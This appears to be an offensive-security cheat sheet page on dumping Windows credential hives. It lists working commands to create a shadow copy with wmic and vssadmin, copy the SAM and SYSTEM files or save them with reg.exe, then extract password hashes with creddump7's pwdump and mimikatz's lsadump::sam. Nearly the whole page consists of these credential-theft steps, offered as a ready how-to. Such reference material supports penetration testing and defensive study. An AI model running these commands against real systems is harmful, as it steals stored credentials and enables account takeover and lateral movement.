# SAM/SYSTEM exfiltration

## SAM/SYSTEM exfiltration

### Shadowcopy SAM database

{% hint style="info" %}
C:\Windows\System32\config\SAM
{% endhint %}

#### Create a copy of the SAM and SYSTEM using shadowcopy

```csharp
wmic shadowcopy call create Volume='c:\'
vssadmin list shadows
```

![](../../../../.gitbook/assets/image%20%28224%29.png)

{% hint style="danger" %}
copy must be done with **cmd**.**exe**
{% endhint %}

```csharp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
```

![](../../../../.gitbook/assets/image%20%2891%29.png)

### Reg save SAM \(alternative\)

## 

```text
reg.exe save hklm\sam c:\test\sam
reg.exe save hklm\system c:\test\system
```

## SAM / SYSTEM decryption

### Creddump

#### Install

```csharp
 sudo apt install python-crypto
 sudo git clone https://github.com/Neohapsis/creddump7
```

```csharp
sudo pacman -Sy creddump
```

#### Usage

```csharp
pwdump SYSTEM SAM
```

![](../../../../.gitbook/assets/image%20%2867%29.png)

### Mimikatz

```text
lsadump::sam /system:C:\test\sam\system /sam:C:\test\sam\sam
```

![](../../../../.gitbook/assets/image%20%28309%29.png)



